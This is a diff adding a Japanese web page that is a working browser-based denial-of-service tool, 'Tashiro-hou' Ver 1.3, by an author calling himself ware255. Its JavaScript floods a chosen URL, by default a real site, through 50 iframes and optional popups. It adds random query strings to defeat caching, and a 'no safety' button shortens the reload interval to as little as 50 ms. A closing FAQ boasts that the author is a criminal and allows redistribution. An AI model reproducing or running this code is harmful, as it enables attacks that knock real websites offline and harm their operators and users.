@@ -1,0 +1,301 @@
+<!--
+超最終兵器田代砲ネ申 Ver 1.3(ちょうさいしゅうへいきたしろほうかみ ばーじょん いってんさん)は、ポップ+フレームで攻撃をする田代砲です。
+(※AAは他サイトからコピペしたものです。一部改変してます)。
+    ∧＿_∧   ／￣￣￣￣￣
+   ( ´∀｀)＜  コピペモナー
+   (       )  ＼＿＿＿＿＿
+    |  |  |
+   (＿_)___)
+開発者:われ(ware255)
+-->
+<!DOCTYPE html>
+<html lang="ja">
+    <head>
+        <meta http-equiv="Content-type" content="text/html; charset=UTF-8">
+        <meta name="viewport" content="width=device-width,initial-scale=0.7">
+        <meta name="format-detection" content="email=no,telephone=no,address=no">
+        <title>超最終兵器田代砲ネ申 Ver 1.3</title>
+        <meta name="keywords" content="田代,田代砲,DoS攻撃,超最終兵器田代砲ネ申,われ,ware255,IA5">
+        <meta name="description" content="ショットガン田代砲と真田代砲Rとプラスαを組み合わせて改造しました。">
+        <meta name="author" content="われ(ware255)">
+        <meta property="og:title" content="超最終兵器田代砲ネ申 Ver 1.3">
+        <meta property="og:type" content="website">
+        <meta property="og:description" content="ショットガン田代砲と真田代砲Rとプラスαを組み合わせて改造しました。">
+        <meta property="og:url" content="http://ware255.web.fc2.com/r_tashiro.html">
+        <meta property="twitter:site" content="ware255">
+        <style>
+        #w {
+            color: #efefbf;
+        }
+        .text-center {
+            text-align: center;
+        }
+        .mx-auto {
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .mr-auto, .ml-auto {
+            margin-right: auto;
+        }
+        *, ::after, ::before {
+            box-sizing: border-box;
+        }
+        body {
+            background-color: #101040;
+            font-family: 'MS PGothic', 'ＭＳ Ｐゴシック', 'メイリオ';
+            color: #ffffff;
+        }
+        </style>
+        <!--[if lt IE 9]>
+            <script src="https://raw.githubusercontent.com/aFarkas/html5shiv/master/src/html5shiv.js"></script>
+        <![endif]-->
+    </head>
+    <body>
+        <div class="mr-0 ml-0 mx-auto text-center">
+            <div>
+                <h1>超最終兵器田代砲ネ申 Ver 1.3</h1>
+                <p>
+                    50個のインラインフレームを使い、各URL先をnミリ秒ごとに自動更新し、ポップアップで攻撃力をアップ!<br><br>
+                    <b>動作確認済みOS</b><br>
+                    Windows 10 バージョン 21H2（OSビルド 19044.1645）<br>
+                    <b>動作確認済みブラウザ</b><br>
+                    Firefox, Microsoft Edge, <del>Internet Explorer11</del><br>
+                </p>
+                <p>
+                    <noscript><br>
+                        <b id="w">※JavaScriptを有効にしてください。田代砲が使えませんよ。</b>
+                    </noscript>
+                </p>
+                <form name="f">
+                    <input size="63" type="text" name="urlEd" value="http://prkorea.com/" onkeypress="key()"><br>
+                    更新間隔（ミリ秒）<br>
+                    <input type="text" size="15" name="ival" value="60000"><br>
+                    POPUP（窓）<br>
+                    <input type="text" size="15" name="pop" value="0"><br><br>
+                    <input type="button" value="砲撃開始" onclick="kS(1);">
+                    <input type="text" size="50" name="sta" value="停止中" readonly="readonly"><br><br>
+                    <input type="button" value="砲撃中止" onclick="kS(0);"><br><br>
+                    <input type="button" value="安全装置など要らぬ 砲撃開始" onclick="kN(1);"><br><br>
+                    <input name="watch" size="47" readonly="readonly"><br><br>
+                    <iframe name="chi1" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi2" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi3" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi4" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi5" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi6" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi7" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi8" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi9" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi10" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe><br>
+                    <iframe name="chi11" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi12" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi13" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi14" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi15" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi16" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi17" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi18" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi19" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi20" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe><br>
+                    <iframe name="chi21" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi22" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi23" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi24" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi25" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi26" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi27" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi28" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi29" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi30" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe><br>
+                    <iframe name="chi31" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi32" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi33" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi34" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi35" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi36" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi37" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi38" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi39" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi40" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe><br>
+                    <iframe name="chi41" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi42" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi43" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi44" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi45" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi46" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi47" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi48" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi49" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                    <iframe name="chi50" src="about:blank" data-ruffle-polyfilled="" width="50" height="50"></iframe>
+                </form>
+            </div>
+        </div>
+        <script>
+        //'use strict';
+        var ch_tbl = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "*", "!", "?", "%", "&"];
+        var pp, tt, uu, ken, ac, timeid, i, j, q, str, w, c;
+        
+        function make_random_str() {
+            str = "";
+            for (j = 0; j < 16; j++)
+                str += ch_tbl[Math.floor(Math.random() * ch_tbl.length)];
+            return str;
+        }
+        
+        function kR(){
+            if(pp === 1) {
+                for (i = 0; i < f.pop.value; i++)
+                    w[i].location = uu + make_random_str();
+                for (i = 1; i < 51; i++)
+                    frames["chi" + i].location.href = uu + make_random_str();
+                if(ken === 1){
+                    f.sta.value="わが生涯に一片の悔いなし！！！("+ tt +"ミリ秒)　"+ q * (++ac) +"連打";
+                    console.log((c++) + ": " + f.urlEd.value + 'を攻撃したお＾＾');
+                }
+                else {
+                    f.sta.value="普通に自動更新中("+ tt +"ミリ秒) アクセス回数は"+ q * (++ac) +"回です";
+                    console.log((c++) + ": " + f.urlEd.value + "を攻撃したお＾＾");
+                }
+            }
+        }
+        
+        
+/*
+
+  ,～（（((((((～～､
+  (  ＿（（ (((＿　)
+  |/　~^^＼)／^^~ヽ|
+  |　　＿　《　＿ |
+ (|-(_//_)-(_//_)-|）
+  |　　　厶､　　　|      ／￣￣￣￣
+  ＼   ||||||||　／　　＜  ミニにタコ
+    ＼_________／        ＼＿＿＿＿
+
+*/
+        
+        
+        function kS(qq){
+            pp = qq;
+            ac = 0;
+            tt = parseFloat(f.ival.value);
+            ken = 0;
+            if(isNaN(tt)) tt = 6e4;
+            //安全装置　10秒以上の更新間隔で。
+            if(tt < 200) tt = 1e4;
+            //安全装置ここまで
+            uu = f.urlEd.value + "?q=";
+            if (uu === location.href) location.href = "http://prkorea.com/";
+            for (i = 0; i < 3; i++) clearInterval(timeid);
+            q = 50 + Number(f.pop.value);
+            if(pp === 1) {
+                c = 0;
+                w = new Array(f.pop.value);
+                for(i = 0; i < f.pop.value; i++)
+                    w[i] = window.open(f.urlEd.value, 'san' + i, 'width=200, height=100');
+                kR();
+                timeid = setInterval("kR()", tt);
+            }
+            else {
+                for(i = 0; i < f.pop.value; i++) w[i].close();
+                i = null;
+                ac = null;
+                j = null;
+                str = null;
+                f.sta.value="自動更新を停止しました。";
+                console.log("攻撃停止");
+            }
+        }
+        
+        function kN(qq) {
+            pp = qq;
+            ac = 0;
+            tt = parseFloat(f.ival.value);
+            ken = 1;
+            if(isNaN(tt)) tt = 200;
+            //安全装置はここから
+            if(tt < 50 || tt > 1000) tt = 250;
+            //ここまで
+            uu = f.urlEd.value + "?q=";
+            if (uu === location.href) location.href = "http://prkorea.com/";
+            for (i = 0; i < 3; i++) clearInterval(timeid);
+            q = 50 + Number(f.pop.value);
+            if (pp === 1) {
+                c = 0;
+                w = new Array(f.pop.value);
+                for(i = 0; i < f.pop.value; i++)
+                    w[i] = window.open(f.urlEd.value, 'san' + i, 'width=200, height=100');
+                kR();
+                timeid = setInterval("kR()", tt);
+            }
+            else {
+                for(i = 0; i < f.pop.value; i++) w[i].close();
+                i = null;
+                ac = null;
+                j = null;
+                str = null;
+                f.sta.value = "自動更新を停止しました。";
+                console.log("攻撃停止");
+            }
+        }
+        
+        function key(){
+            if(event.keyCode === 13){
+                uu = f.urlEd.value + "?q=";
+                for (i = 1; i < 51; i++)
+                    frames["chi" + i].location.href = uu + make_random_str();
+                kS(0);
+            }
+        }
+        
+        // 時計
+        
+        var MyMon0, MyDay0, MyHour0, MyMin0, MyMon1, MyDay1, MyHour1, MyMin1, MySec0, MySec1, baku; 
+        
+        Watch();
+        
+        function Watch() {
+            now = new Date();
+            hour = now.getHours();
+            minute = now.getMinutes();
+            second = now.getSeconds();
+            if (hour < 10) {
+                hour = '0' + hour;
+            }
+            if (minute < 10) {
+                minute = '0' + minute;
+            }
+            if (second < 10) {
+                second = '0' + second;
+            }
+            f.watch.value = '現在の時刻：' + hour + '時' + minute + '分' + second + '秒'; 
+            setTimeout("Watch();", 1000);
+        }
+        </script>
+    <script type="text/javascript"><!--
+var fc2footerparam = 'charset=' + encodeURIComponent(document.charset ? document.charset : document.characterSet) + '&url=' + encodeURIComponent(document.location) + '&service=0&r=' + Math.floor(Math.random()*99999999999);
+var fc2footertag = '<' + 'script src="//vip.chps-api.fc2.com/apis/footer/?' + fc2footerparam + '" charset="UTF-8"><' + '/script>';
+document.write(fc2footertag);
+//--></script>
+<!-- FC2, inc.-->
+<img src="//media.fc2.com/counter_img.php?id=50" style="visibility:hidden" alt="inserted by FC2 system" width="0" height="0">
+<!-- FC2, inc.-->
+</body>
+</html>
+<!--
+質問されそうなfqa
+
+Q. われ(ware255)さんは、犯罪者ですか？
+A. はい。兵庫県警には、捕まらないほど。
+
+Q. 本物のプログラマーですか？
+A. 自称天才Fortranプログラマーです。
+
+Q. 二次配布OK？
+A. 開発者の名前を入れるならOKだお。宣伝も同様だお。
+
+Q. どのブラウザでも機能しますか？
+A. 全てのブラウザで動作確認をしていませんので、はっきりとお答え出来ません。
+
+Q. 彼女はいますか？
+A. はい。紲○あかりちゃんがいます。
+-->
